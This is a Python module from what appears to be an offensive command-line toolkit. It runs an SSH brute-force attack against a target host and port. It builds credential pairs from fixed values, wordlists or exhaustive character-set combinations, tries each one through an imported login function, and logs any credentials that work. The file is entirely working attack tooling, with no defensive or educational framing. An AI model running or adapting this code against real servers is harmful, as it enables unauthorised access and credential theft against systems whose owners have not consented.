"""
SSH Brute Force Attack
Supports fixed/wordlist usernames and passwords against SSH services using Paramiko.
"""
import itertools
import random
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeElapsedColumn

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig, CredentialMode, load_wordlist
from modules.attacks.common import attempt, save_result, apply_delay


def run(target: TargetInfo, config: AttackConfig) -> None:
    console.print(
        f"\n[bold primary][ SSH BRUTE FORCE ][/bold primary]\n"
        f"  [muted]Target    :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [muted]Delay     :[/muted] [text]{config.delay}s[/text]\n"
    )

    # 1. Load Usernames
    if config.username_mode == CredentialMode.RANDOM_FROM_LIST:
        users = load_wordlist(config.username_file)
    elif config.username_value:
        users = [config.username_value]
    else:
        users = ["root"]

    # 2. Setup Password list
    if config.password_mode == CredentialMode.RANDOM_FROM_LIST:
        passwords = load_wordlist(config.password_file)
        pairs = [(u, p) for u in users for p in passwords]
    elif config.password_value:
        pairs = [(u, config.password_value) for u in users]
    else:
        # Charset exhaustion mode
        pairs = None

    found = False
    found_user = ""
    found_pass = ""

    if pairs is not None:
        if config.random_order:
            random.shuffle(pairs)

        total = len(pairs)
        console.print(f"  [muted]Total candidate pairs:[/muted] [primary]{total:,}[/primary]\n")

        with Progress(
            SpinnerColumn(style="primary"),
            TextColumn("[muted]Trying:[/muted] [text]{task.fields[cred]}[/text]"),
            BarColumn(bar_width=30, style="primary", complete_style="success"),
            TaskProgressColumn(),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task_id = progress.add_task("ssh_brute", total=total, cred="…")
            for u, p in pairs:
                progress.update(task_id, advance=1, cred=f"{u}:{p}")
                if attempt(target.host, target.port, u, p, "ssh"):
                    found = True
                    found_user = u
                    found_pass = p
                    break
                apply_delay(config.delay)

    else:
        # Charset iteration mode
        max_l = config.max_length or 4
        charset = config.charset
        u = users[0]
        total = sum(len(charset) ** length for length in range(1, max_l + 1))
        console.print(f"  [muted]Charset:[/muted] {charset!r} (max len {max_l})\n")

        with Progress(
            SpinnerColumn(style="primary"),
            TextColumn("[muted]Trying:[/muted] [text]{task.fields[cred]}[/text]"),
            BarColumn(bar_width=30, style="primary", complete_style="success"),
            TaskProgressColumn(),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task_id = progress.add_task("ssh_brute", total=total, cred="…")
            for length in range(1, max_l + 1):
                for combo in itertools.product(charset, repeat=length):
                    p = "".join(combo)
                    progress.update(task_id, advance=1, cred=f"{u}:{p}")
                    if attempt(target.host, target.port, u, p, "ssh"):
                        found = True
                        found_user = u
                        found_pass = p
                        break
                    apply_delay(config.delay)
                if found:
                    break

    if found:
        save_result(target.host, target.port, found_user, found_pass, config.log_file, "ssh")
    else:
        console.print("\n[error]✗ SSH Brute Force completed — no valid credentials found.[/error]\n")
